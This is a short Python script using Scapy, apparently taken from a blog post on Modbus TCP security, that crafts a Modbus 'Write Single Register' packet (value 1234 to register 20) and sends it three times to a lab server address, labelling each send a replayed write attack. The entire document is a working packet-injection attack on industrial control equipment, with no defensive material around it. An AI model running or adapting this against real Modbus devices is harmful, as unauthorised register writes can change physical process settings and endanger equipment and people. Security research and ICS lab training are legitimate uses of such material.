# replay_modbus.py
# Source: https://mustafaalshawwa.com/posts/modbustcp/
from scapy.all import *
import time
# Write value 1234 to address 20
modbus_payload = (
    b'\x00\x04'       # Transaction ID: 4
    b'\x00\x00'       # Protocol ID: 0
    b'\x00\x06'       # Length
    b'\x01'           # Unit ID
    b'\x06'           # Function Code 6: Write Single Register
    b'\x00\x14'       # Register address: 20
    b'\x04\xd2'       # Value: 1234 (0x04D2)
)

ip = IP(dst="172.16.141.129")  # Your Modbus server IP
tcp = TCP(dport=5020, sport=RandShort(), flags="PA", seq=1000)
packet = ip / tcp / Raw(load=modbus_payload)
for i in range(3):
    send(packet)
    print(f"[+] Replayed Write Register Attack #{i+1}")
    time.sleep(1)
